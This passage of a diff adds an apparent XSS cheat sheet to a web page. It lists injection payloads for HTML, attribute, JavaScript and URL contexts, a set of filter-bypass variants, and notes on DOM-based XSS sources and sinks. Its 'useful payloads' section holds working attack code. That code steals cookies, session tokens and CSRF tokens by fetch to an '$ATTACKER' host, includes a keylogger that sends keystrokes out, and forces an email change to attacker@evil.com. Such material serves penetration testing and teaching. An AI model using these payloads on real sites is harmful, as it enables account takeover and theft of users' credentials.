+</span><span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">- In a URL: href="xsstest1234"</span>
+</pre>
+</div></div>
+
+<p>
+The context determines which payload to use.
+</p>
+</div>
+</div>
+</div>
+<div id="outline-container-orga81f1b5" class="outline-2">
+<h2 id="orga81f1b5">3. Payloads by Context</h2>
+<div class="outline-text-2" id="text-orga81f1b5">
+</div>
+<div id="outline-container-org0f7e1ee" class="outline-3">
+<h3 id="org0f7e1ee">HTML Body Context</h3>
+<div class="outline-text-3" id="text-org0f7e1ee">
+<div class='org-src-wrapper'>
+<div class='org-src-bar'><span class='srcLangLabel'>HTML</span><button class='copyBtn' name=btn_a9f6d9b8184d4607b136469994b80411>&#10697;</button>
+<script type='text/javascript'>
+var copyBtnbtn_a9f6d9b8184d4607b136469994b80411=document.querySelector('button[name=btn_a9f6d9b8184d4607b136469994b80411]');
+copyBtnbtn_a9f6d9b8184d4607b136469994b80411.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`<script>alert(1)</script>\n<script>alert(document.domain)</script>\n<img src=x onerror=alert(1)>\n<svg onload=alert(1)>\n<body onload=alert(1)>\n<iframe src=\"javascript:alert(1)\">\n`);copyBtnbtn_a9f6d9b8184d4607b136469994b80411.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_a9f6d9b8184d4607b136469994b80411.innerHTML = '&#10697;'}, 3000);
+});
+</script>
+</div><div class="org-src-container">
+<pre class="src src-html">&lt;<span style="color: var(--function-clr-name); background-color: var(--function-bg-name);">script</span>&gt;alert(1)&lt;/<span style="color: var(--function-clr-name); background-color: var(--function-bg-name);">script</span>&gt;
+&lt;<span style="color: var(--function-clr-name); background-color: var(--function-bg-name);">script</span>&gt;alert(document.domain)&lt;/<span style="color: var(--function-clr-name); background-color: var(--function-bg-name);">script</span>&gt;
+&lt;<span style="color: var(--function-clr-name); background-color: var(--function-bg-name);">img</span> src=x onerror=alert(1)&gt;
+&lt;<span style="color: var(--function-clr-name); background-color: var(--function-bg-name);">svg</span> onload=alert(1)&gt;
+&lt;<span style="color: var(--function-clr-name); background-color: var(--function-bg-name);">body</span> onload=alert(1)&gt;
+&lt;<span style="color: var(--function-clr-name); background-color: var(--function-bg-name);">iframe</span> <span style="color: var(--clr-variable); background-color: var(--bg-variable);">src</span>=<span style="color: var(--clr-string); background-color: var(--bg-string);">"javascript:alert(1)"</span>&gt;
+</pre>
+</div></div>
+</div>
+</div>
+<div id="outline-container-org2549f31" class="outline-3">
+<h3 id="org2549f31">HTML Attribute Context</h3>
+<div class="outline-text-3" id="text-org2549f31">
+<div class='org-src-wrapper'>
+<div class='org-src-bar'><span class='srcLangLabel'>HTML</span><button class='copyBtn' name=btn_b2a1e52ae1be491da7c214c4e0122d45>&#10697;</button>
+<script type='text/javascript'>
+var copyBtnbtn_b2a1e52ae1be491da7c214c4e0122d45=document.querySelector('button[name=btn_b2a1e52ae1be491da7c214c4e0122d45]');
+copyBtnbtn_b2a1e52ae1be491da7c214c4e0122d45.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`<!-- Input: <input value=\"INJECT\"> -->\n\" onmouseover=\"alert(1)\n\" autofocus onfocus=\"alert(1)\n\"><script>alert(1)</script>\n\" onclick=\"alert(1)\" \"\n`);copyBtnbtn_b2a1e52ae1be491da7c214c4e0122d45.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_b2a1e52ae1be491da7c214c4e0122d45.innerHTML = '&#10697;'}, 3000);
+});
+</script>
+</div><div class="org-src-container">
+<pre class="src src-html"><span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);">&lt;!-- </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">Input: &lt;input value="INJECT"&gt;</span><span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"> --&gt;</span>
+" <span style="color: var(--clr-variable); background-color: var(--bg-variable);">onmouseover</span>="alert(1)
+" autofocus <span style="color: var(--clr-variable); background-color: var(--bg-variable);">onfocus</span>="alert(1)
+"&gt;&lt;<span style="color: var(--function-clr-name); background-color: var(--function-bg-name);">script</span>&gt;alert(1)&lt;/<span style="color: var(--function-clr-name); background-color: var(--function-bg-name);">script</span>&gt;
+" <span style="color: var(--clr-variable); background-color: var(--bg-variable);">onclick</span>="alert(1)" "
+</pre>
+</div></div>
+</div>
+</div>
+<div id="outline-container-org21f4246" class="outline-3">
+<h3 id="org21f4246">JavaScript String Context</h3>
+<div class="outline-text-3" id="text-org21f4246">
+<div class='org-src-wrapper'>
+<div class='org-src-bar'><span class='srcLangLabel'>JAVASCRIPT</span><button class='copyBtn' name=btn_cd12ce9cb110433e946066c0b2c87914>&#10697;</button>
+<script type='text/javascript'>
+var copyBtnbtn_cd12ce9cb110433e946066c0b2c87914=document.querySelector('button[name=btn_cd12ce9cb110433e946066c0b2c87914]');
+copyBtnbtn_cd12ce9cb110433e946066c0b2c87914.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`// Input: var x = \"INJECT\";\n\"-alert(1)-\"\n\";alert(1)//\n\\\";alert(1)//\n'+alert(1)+'\n`);copyBtnbtn_cd12ce9cb110433e946066c0b2c87914.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_cd12ce9cb110433e946066c0b2c87914.innerHTML = '&#10697;'}, 3000);
+});
+</script>
+</div><div class="org-src-container">
+<pre class="src src-javascript"><span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);">// </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">Input: var x = "INJECT";
+</span><span style="color: var(--clr-string); background-color: var(--bg-string);">"-alert(1)-"</span>
+<span style="color: var(--clr-string); background-color: var(--bg-string);">";alert(1)//
+\";alert(1)//
+'+alert(1)+'</span>
+</pre>
+</div></div>
+</div>
+</div>
+<div id="outline-container-org5e7efb2" class="outline-3">
+<h3 id="org5e7efb2">JavaScript Template Literal Context</h3>
+<div class="outline-text-3" id="text-org5e7efb2">
+<div class='org-src-wrapper'>
+<div class='org-src-bar'><span class='srcLangLabel'>JAVASCRIPT</span><button class='copyBtn' name=btn_33e88464c7054e3bb32775ac30b7dc82>&#10697;</button>
+<script type='text/javascript'>
+var copyBtnbtn_33e88464c7054e3bb32775ac30b7dc82=document.querySelector('button[name=btn_33e88464c7054e3bb32775ac30b7dc82]');
+copyBtnbtn_33e88464c7054e3bb32775ac30b7dc82.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`// Input: var x = \`INJECT\`;\n${alert(1)}\n`);copyBtnbtn_33e88464c7054e3bb32775ac30b7dc82.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_33e88464c7054e3bb32775ac30b7dc82.innerHTML = '&#10697;'}, 3000);
+});
+</script>
+</div><div class="org-src-container">
+<pre class="src src-javascript"><span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);">// </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">Input: var x = `INJECT`;
+</span>${alert(1)}
+</pre>
+</div></div>
+</div>
+</div>
+<div id="outline-container-org815c20c" class="outline-3">
+<h3 id="org815c20c">URL/href Context</h3>
+<div class="outline-text-3" id="text-org815c20c">
+<div class='org-src-wrapper'>
+<div class='org-src-bar'><span class='srcLangLabel'>HTML</span><button class='copyBtn' name=btn_78e735f4aeb4483ba5b9aedfec653664>&#10697;</button>
+<script type='text/javascript'>
+var copyBtnbtn_78e735f4aeb4483ba5b9aedfec653664=document.querySelector('button[name=btn_78e735f4aeb4483ba5b9aedfec653664]');
+copyBtnbtn_78e735f4aeb4483ba5b9aedfec653664.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`<!-- Input: <a href=\"INJECT\"> -->\njavascript:alert(1)\n`);copyBtnbtn_78e735f4aeb4483ba5b9aedfec653664.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_78e735f4aeb4483ba5b9aedfec653664.innerHTML = '&#10697;'}, 3000);
+});
+</script>
+</div><div class="org-src-container">
+<pre class="src src-html"><span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);">&lt;!-- </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">Input: &lt;a href="INJECT"&gt;</span><span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"> --&gt;</span>
+javascript:alert(1)
+</pre>
+</div></div>
+</div>
+</div>
+</div>
+<div id="outline-container-org295dd7a" class="outline-2">
+<h2 id="org295dd7a">4. Filter Bypass Techniques</h2>
+<div class="outline-text-2" id="text-org295dd7a">
+<div class='org-src-wrapper'>
+<div class='org-src-bar'><span class='srcLangLabel'>HTML</span><button class='copyBtn' name=btn_f2a9c94456fe44f8802918bc5bcd1e54>&#10697;</button>
+<script type='text/javascript'>
+var copyBtnbtn_f2a9c94456fe44f8802918bc5bcd1e54=document.querySelector('button[name=btn_f2a9c94456fe44f8802918bc5bcd1e54]');
+copyBtnbtn_f2a9c94456fe44f8802918bc5bcd1e54.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`<!-- Case variation -->\n<ScRiPt>alert(1)</ScRiPt>\n<SCRIPT>alert(1)</SCRIPT>\n\n<!-- No quotes -->\n<img src=x onerror=alert(1)>\n\n<!-- No parentheses -->\n<img src=x onerror=alert\`1\`>\n\n<!-- HTML entities -->\n<img src=x onerror=&#97;lert(1)>\n<img src=x onerror=&#x61;lert(1)>\n\n<!-- Double encoding -->\n%253Cscript%253Ealert(1)%253C/script%253E\n\n<!-- Whitespace variations -->\n<img src=x    onerror   =   alert(1)>\n<img/src=x/onerror=alert(1)>\n\n<!-- Alternative event handlers -->\n<body onpageshow=alert(1)>\n<input autofocus onfocus=alert(1)>\n<select autofocus onfocus=alert(1)>\n<video src=x onerror=alert(1)>\n<audio src=x onerror=alert(1)>\n\n<!-- Broken tag — some parsers repair it -->\n<scr<script>ipt>alert(1)</scr</script>ipt>\n\n<!-- SVG vectors -->\n<svg><script>alert(1)</script></svg>\n<svg><animate onbegin=alert(1) attributeName=x>\n`);copyBtnbtn_f2a9c94456fe44f8802918bc5bcd1e54.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_f2a9c94456fe44f8802918bc5bcd1e54.innerHTML = '&#10697;'}, 3000);
+});
+</script>
+</div><div class="org-src-container">
+<pre class="src src-html"><span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);">&lt;!-- </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">Case variation</span><span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"> --&gt;</span>
+&lt;<span style="color: var(--function-clr-name); background-color: var(--function-bg-name);">ScRiPt</span>&gt;alert(1)&lt;/<span style="color: var(--function-clr-name); background-color: var(--function-bg-name);">ScRiPt</span>&gt;
+&lt;<span style="color: var(--function-clr-name); background-color: var(--function-bg-name);">SCRIPT</span>&gt;alert(1)&lt;/<span style="color: var(--function-clr-name); background-color: var(--function-bg-name);">SCRIPT</span>&gt;
+
+<span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);">&lt;!-- </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">No quotes</span><span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"> --&gt;</span>
+&lt;<span style="color: var(--function-clr-name); background-color: var(--function-bg-name);">img</span> src=x onerror=alert(1)&gt;
+
+<span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);">&lt;!-- </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">No parentheses</span><span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"> --&gt;</span>
+&lt;<span style="color: var(--function-clr-name); background-color: var(--function-bg-name);">img</span> src=x onerror=alert`1`&gt;
+
+<span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);">&lt;!-- </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">HTML entities</span><span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"> --&gt;</span>
+&lt;<span style="color: var(--function-clr-name); background-color: var(--function-bg-name);">img</span> src=x onerror=&amp;#97;lert(1)&gt;
+&lt;<span style="color: var(--function-clr-name); background-color: var(--function-bg-name);">img</span> src=x onerror=&amp;#x61;lert(1)&gt;
+
+<span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);">&lt;!-- </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">Double encoding</span><span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"> --&gt;</span>
+%253Cscript%253Ealert(1)%253C/script%253E
+
+<span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);">&lt;!-- </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">Whitespace variations</span><span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"> --&gt;</span>
+&lt;<span style="color: var(--function-clr-name); background-color: var(--function-bg-name);">img</span> src=x    onerror   =   alert(1)&gt;
+&lt;<span style="color: var(--function-clr-name); background-color: var(--function-bg-name);">img</span>/src=x/onerror=alert(1)&gt;
+
+<span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);">&lt;!-- </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">Alternative event handlers</span><span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"> --&gt;</span>
+&lt;<span style="color: var(--function-clr-name); background-color: var(--function-bg-name);">body</span> onpageshow=alert(1)&gt;
+&lt;<span style="color: var(--function-clr-name); background-color: var(--function-bg-name);">input</span> autofocus onfocus=alert(1)&gt;
+&lt;<span style="color: var(--function-clr-name); background-color: var(--function-bg-name);">select</span> autofocus onfocus=alert(1)&gt;
+&lt;<span style="color: var(--function-clr-name); background-color: var(--function-bg-name);">video</span> src=x onerror=alert(1)&gt;
+&lt;<span style="color: var(--function-clr-name); background-color: var(--function-bg-name);">audio</span> src=x onerror=alert(1)&gt;
+
+<span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);">&lt;!-- </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">Broken tag &#8212; some parsers repair it</span><span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"> --&gt;</span>
+&lt;<span style="color: var(--function-clr-name); background-color: var(--function-bg-name);">scr</span>&lt;<span style="color: var(--function-clr-name); background-color: var(--function-bg-name);">script</span>&gt;ipt&gt;alert(1)&lt;/<span style="color: var(--function-clr-name); background-color: var(--function-bg-name);">scr</span>&lt;/<span style="color: var(--function-clr-name); background-color: var(--function-bg-name);">script</span>&gt;ipt&gt;
+
+<span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);">&lt;!-- </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">SVG vectors</span><span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"> --&gt;</span>
+&lt;<span style="color: var(--function-clr-name); background-color: var(--function-bg-name);">svg</span>&gt;&lt;<span style="color: var(--function-clr-name); background-color: var(--function-bg-name);">script</span>&gt;alert(1)&lt;/<span style="color: var(--function-clr-name); background-color: var(--function-bg-name);">script</span>&gt;&lt;/<span style="color: var(--function-clr-name); background-color: var(--function-bg-name);">svg</span>&gt;
+&lt;<span style="color: var(--function-clr-name); background-color: var(--function-bg-name);">svg</span>&gt;&lt;<span style="color: var(--function-clr-name); background-color: var(--function-bg-name);">animate</span> onbegin=alert(1) attributeName=x&gt;
+</pre>
+</div></div>
+</div>
+</div>
+<div id="outline-container-org1de18dc" class="outline-2">
+<h2 id="org1de18dc">5. Useful Payloads Beyond alert(1)</h2>
+<div class="outline-text-2" id="text-org1de18dc">
+</div>
+<div id="outline-container-orge026e2a" class="outline-3">
+<h3 id="orge026e2a">Confirm the origin (cleaner proof than alert)</h3>
+<div class="outline-text-3" id="text-orge026e2a">
+<div class='org-src-wrapper'>
+<div class='org-src-bar'><span class='srcLangLabel'>JAVASCRIPT</span><button class='copyBtn' name=btn_f7a5b69d683c493f8ab1c050f0fc660b>&#10697;</button>
+<script type='text/javascript'>
+var copyBtnbtn_f7a5b69d683c493f8ab1c050f0fc660b=document.querySelector('button[name=btn_f7a5b69d683c493f8ab1c050f0fc660b]');
+copyBtnbtn_f7a5b69d683c493f8ab1c050f0fc660b.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`alert(document.domain)\n`);copyBtnbtn_f7a5b69d683c493f8ab1c050f0fc660b.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_f7a5b69d683c493f8ab1c050f0fc660b.innerHTML = '&#10697;'}, 3000);
+});
+</script>
+</div><div class="org-src-container">
+<pre class="src src-javascript">alert(document.domain)
+</pre>
+</div></div>
+</div>
+</div>
+<div id="outline-container-org085d234" class="outline-3">
+<h3 id="org085d234">Cookie theft</h3>
+<div class="outline-text-3" id="text-org085d234">
+<div class='org-src-wrapper'>
+<div class='org-src-bar'><span class='srcLangLabel'>JAVASCRIPT</span><button class='copyBtn' name=btn_9398a1b3cb194a8b9c91cd89bf904115>&#10697;</button>
+<script type='text/javascript'>
+var copyBtnbtn_9398a1b3cb194a8b9c91cd89bf904115=document.querySelector('button[name=btn_9398a1b3cb194a8b9c91cd89bf904115]');
+copyBtnbtn_9398a1b3cb194a8b9c91cd89bf904115.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`// Send cookie to attacker server\n<script>\nfetch('https://$ATTACKER/?c=' + document.cookie)\n</script>\n\n// Image tag alternative — no JS fetch needed\n<img src=x onerror=\"this.src='https://$ATTACKER/?c='+document.cookie\">\n`);copyBtnbtn_9398a1b3cb194a8b9c91cd89bf904115.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_9398a1b3cb194a8b9c91cd89bf904115.innerHTML = '&#10697;'}, 3000);
+});
+</script>
+</div><div class="org-src-container">
+<pre class="src src-javascript"><span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);">// </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">Send cookie to attacker server
+</span>&lt;script&gt;
+fetch(<span style="color: var(--clr-string); background-color: var(--bg-string);">'https://$ATTACKER/?c='</span> + document.cookie)
+&lt;/script&gt;
+
+<span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);">// </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">Image tag alternative &#8212; no JS fetch needed
+</span>&lt;img src=x onerror=<span style="color: var(--clr-string); background-color: var(--bg-string);">"this.src='https://$ATTACKER/?c='+document.cookie"</span>&gt;
+</pre>
+</div></div>
+</div>
+</div>
+<div id="outline-container-org23d68ac" class="outline-3">
+<h3 id="org23d68ac">Session token theft (localStorage)</h3>
+<div class="outline-text-3" id="text-org23d68ac">
+<div class='org-src-wrapper'>
+<div class='org-src-bar'><span class='srcLangLabel'>JAVASCRIPT</span><button class='copyBtn' name=btn_f38b6c77422e46bb91fc555d9e8836b0>&#10697;</button>
+<script type='text/javascript'>
+var copyBtnbtn_f38b6c77422e46bb91fc555d9e8836b0=document.querySelector('button[name=btn_f38b6c77422e46bb91fc555d9e8836b0]');
+copyBtnbtn_f38b6c77422e46bb91fc555d9e8836b0.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`<script>\nfetch('https://$ATTACKER/?t=' + localStorage.getItem('token'))\n</script>\n`);copyBtnbtn_f38b6c77422e46bb91fc555d9e8836b0.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_f38b6c77422e46bb91fc555d9e8836b0.innerHTML = '&#10697;'}, 3000);
+});
+</script>
+</div><div class="org-src-container">
+<pre class="src src-javascript">&lt;script&gt;
+fetch(<span style="color: var(--clr-string); background-color: var(--bg-string);">'https://$ATTACKER/?t='</span> + localStorage.getItem(<span style="color: var(--clr-string); background-color: var(--bg-string);">'token'</span>))
+&lt;/script&gt;
+</pre>
+</div></div>
+</div>
+</div>
+<div id="outline-container-orgada0c8f" class="outline-3">
+<h3 id="orgada0c8f">Keylogger</h3>
+<div class="outline-text-3" id="text-orgada0c8f">
+<div class='org-src-wrapper'>
+<div class='org-src-bar'><span class='srcLangLabel'>JAVASCRIPT</span><button class='copyBtn' name=btn_27796d7e0ae64f2c8970a57dd5f5b939>&#10697;</button>
+<script type='text/javascript'>
+var copyBtnbtn_27796d7e0ae64f2c8970a57dd5f5b939=document.querySelector('button[name=btn_27796d7e0ae64f2c8970a57dd5f5b939]');
+copyBtnbtn_27796d7e0ae64f2c8970a57dd5f5b939.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`<script>\ndocument.onkeypress = function(e) {\n  fetch('https://$ATTACKER/?k=' + e.key);\n}\n</script>\n`);copyBtnbtn_27796d7e0ae64f2c8970a57dd5f5b939.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_27796d7e0ae64f2c8970a57dd5f5b939.innerHTML = '&#10697;'}, 3000);
+});
+</script>
+</div><div class="org-src-container">
+<pre class="src src-javascript">&lt;script&gt;
+document.onkeypress = <span style="color: var(--clr-keyword); background-color: var(--bg-keyword);">function</span>(<span style="color: var(--clr-variable); background-color: var(--bg-variable);">e</span>) {
+  fetch(<span style="color: var(--clr-string); background-color: var(--bg-string);">'https://$ATTACKER/?k='</span> + e.key);
+}
+&lt;/script&gt;
+</pre>
+</div></div>
+</div>
+</div>
+<div id="outline-container-orgee9010d" class="outline-3">
+<h3 id="orgee9010d">Forced request as victim (CSRF via XSS)</h3>
+<div class="outline-text-3" id="text-orgee9010d">
+<div class='org-src-wrapper'>
+<div class='org-src-bar'><span class='srcLangLabel'>JAVASCRIPT</span><button class='copyBtn' name=btn_116ae11ebcba46ddbb6f63a40fbc0525>&#10697;</button>
+<script type='text/javascript'>
+var copyBtnbtn_116ae11ebcba46ddbb6f63a40fbc0525=document.querySelector('button[name=btn_116ae11ebcba46ddbb6f63a40fbc0525]');
+copyBtnbtn_116ae11ebcba46ddbb6f63a40fbc0525.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`<script>\nfetch('https://target.com/account/change-email', {\n  method: 'POST',\n  credentials: 'include',\n  headers: {'Content-Type': 'application/x-www-form-urlencoded'},\n  body: 'email=attacker@evil.com'\n})\n</script>\n`);copyBtnbtn_116ae11ebcba46ddbb6f63a40fbc0525.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_116ae11ebcba46ddbb6f63a40fbc0525.innerHTML = '&#10697;'}, 3000);
+});
+</script>
+</div><div class="org-src-container">
+<pre class="src src-javascript">&lt;script&gt;
+fetch(<span style="color: var(--clr-string); background-color: var(--bg-string);">'https://target.com/account/change-email'</span>, {
+  method: <span style="color: var(--clr-string); background-color: var(--bg-string);">'POST'</span>,
+  credentials: <span style="color: var(--clr-string); background-color: var(--bg-string);">'include'</span>,
+  headers: {<span style="color: var(--clr-string); background-color: var(--bg-string);">'Content-Type'</span>: <span style="color: var(--clr-string); background-color: var(--bg-string);">'application/x-www-form-urlencoded'</span>},
+  body: <span style="color: var(--clr-string); background-color: var(--bg-string);">'email=attacker@evil.com'</span>
+})
+&lt;/script&gt;
+</pre>
+</div></div>
+</div>
+</div>
+<div id="outline-container-org258040d" class="outline-3">
+<h3 id="org258040d">Capture and exfiltrate CSRF token</h3>
+<div class="outline-text-3" id="text-org258040d">
+<div class='org-src-wrapper'>
+<div class='org-src-bar'><span class='srcLangLabel'>JAVASCRIPT</span><button class='copyBtn' name=btn_91f359e16fcc4e79b0726d81854db7c1>&#10697;</button>
+<script type='text/javascript'>
+var copyBtnbtn_91f359e16fcc4e79b0726d81854db7c1=document.querySelector('button[name=btn_91f359e16fcc4e79b0726d81854db7c1]');
+copyBtnbtn_91f359e16fcc4e79b0726d81854db7c1.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`<script>\nfetch('/account/settings')\n  .then(r => r.text())\n  .then(html => {\n    const token = html.match(/csrf_token.*?value=\"([^\"]+)\"/)[1];\n    fetch('https://$ATTACKER/?token=' + token);\n  })\n</script>\n`);copyBtnbtn_91f359e16fcc4e79b0726d81854db7c1.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_91f359e16fcc4e79b0726d81854db7c1.innerHTML = '&#10697;'}, 3000);
+});
+</script>
+</div><div class="org-src-container">
+<pre class="src src-javascript">&lt;script&gt;
+fetch(<span style="color: var(--clr-string); background-color: var(--bg-string);">'/account/settings'</span>)
+  .then(r =&gt; r.text())
+  .then(html =&gt; {
+    <span style="color: var(--clr-keyword); background-color: var(--bg-keyword);">const</span> <span style="color: var(--clr-variable); background-color: var(--bg-variable);">token</span> = html.match(<span style="color: var(--clr-string); background-color: var(--bg-string);">/csrf_token.*?value="([^"]+)"/</span>)[1];
+    fetch(<span style="color: var(--clr-string); background-color: var(--bg-string);">'https://$ATTACKER/?token='</span> + token);
+  })
+&lt;/script&gt;
+</pre>
+</div></div>
+</div>
+</div>
+</div>
+<div id="outline-container-org7c0f14d" class="outline-2">
+<h2 id="org7c0f14d">6. DOM-Based XSS</h2>
+<div class="outline-text-2" id="text-org7c0f14d">
+<p>
+The payload never reaches the server — JavaScript reads from a
+source and writes to a sink without sanitisation.
+</p>
+</div>
+<div id="outline-container-org8bef27d" class="outline-3">
+<h3 id="org8bef27d">Common Sources (attacker-controlled input)</h3>
+<div class="outline-text-3" id="text-org8bef27d">
+<div class='org-src-wrapper'>
+<div class='org-src-bar'><span class='srcLangLabel'>TEXT</span><button class='copyBtn' name=btn_1446ee56d2af47bfbe1ce19828d670d7>&#10697;</button>
+<script type='text/javascript'>
+var copyBtnbtn_1446ee56d2af47bfbe1ce19828d670d7=document.querySelector('button[name=btn_1446ee56d2af47bfbe1ce19828d670d7]');
+copyBtnbtn_1446ee56d2af47bfbe1ce19828d670d7.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`document.URL\ndocument.location\ndocument.location.hash    ← common — hash never sent to server\ndocument.referrer\nwindow.name\n`);copyBtnbtn_1446ee56d2af47bfbe1ce19828d670d7.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_1446ee56d2af47bfbe1ce19828d670d7.innerHTML = '&#10697;'}, 3000);
+});
+</script>
+</div><div class="org-src-container">
+<pre class="src src-text">document.URL
+document.location
+document.location.hash    &#8592; common &#8212; hash never sent to server
+document.referrer
+window.name
+</pre>
+</div></div>
+</div>
+</div>
+<div id="outline-container-org74ed0c8" class="outline-3">
+<h3 id="org74ed0c8">Common Sinks (dangerous write operations)</h3>
+<div class="outline-text-3" id="text-org74ed0c8">
+<div class='org-src-wrapper'>
+<div class='org-src-bar'><span class='srcLangLabel'>TEXT</span><button class='copyBtn' name=btn_0cd99bcd0747449f970772f3ebea0ab1>&#10697;</button>
+<script type='text/javascript'>
+var copyBtnbtn_0cd99bcd0747449f970772f3ebea0ab1=document.querySelector('button[name=btn_0cd99bcd0747449f970772f3ebea0ab1]');
+copyBtnbtn_0cd99bcd0747449f970772f3ebea0ab1.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`innerHTML\ndocument.write()\neval()\nsetTimeout() / setInterval() with string argument\nlocation.href\nsrc attribute assignment\n`);copyBtnbtn_0cd99bcd0747449f970772f3ebea0ab1.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_0cd99bcd0747449f970772f3ebea0ab1.innerHTML = '&#10697;'}, 3000);
+});
+</script>
+</div><div class="org-src-container">
+<pre class="src src-text">innerHTML
+document.write()
+eval()
+setTimeout() / setInterval() with string argument
+location.href
+src attribute assignment
+</pre>
+</div></div>
+</div>
+</div>
+<div id="outline-container-orgefc27e2" class="outline-3">
+<h3 id="orgefc27e2">Testing DOM XSS</h3>
+<div class="outline-text-3" id="text-orgefc27e2">
+<div class='org-src-wrapper'>
+<div class='org-src-bar'><span class='srcLangLabel'>JAVASCRIPT</span><button class='copyBtn' name=btn_d5dd9ccb3c334ae0894c6a8922b498c3>&#10697;</button>
+<script type='text/javascript'>
+var copyBtnbtn_d5dd9ccb3c334ae0894c6a8922b498c3=document.querySelector('button[name=btn_d5dd9ccb3c334ae0894c6a8922b498c3]');
+copyBtnbtn_d5dd9ccb3c334ae0894c6a8922b498c3.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`// Check the hash — common entry point\nhttps://target.com/page#<img src=x onerror=alert(1)>\n\n// Check URL parameters read by JS\nhttps://target.com/page?name=<script>alert(1)</script>\n\n// Use browser DevTools → Sources → search for sources being passed to sinks\n// Search for: innerHTML, document.write, eval, location.href\n`);copyBtnbtn_d5dd9ccb3c334ae0894c6a8922b498c3.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_d5dd9ccb3c334ae0894c6a8922b498c3.innerHTML = '&#10697;'}, 3000);
+});
+</script>
+</div><div class="org-src-container">
+<pre class="src src-javascript"><span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);">// </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">Check the hash &#8212; common entry point
+</span>https:<span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);">//</span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">target.com/page#&lt;img src=x onerror=alert(1)&gt;
+</span>
+<span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);">// </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">Check URL parameters read by JS
+</span>https:<span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);">//</span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">target.com/page?name=&lt;script&gt;alert(1)&lt;/script&gt;
+</span>
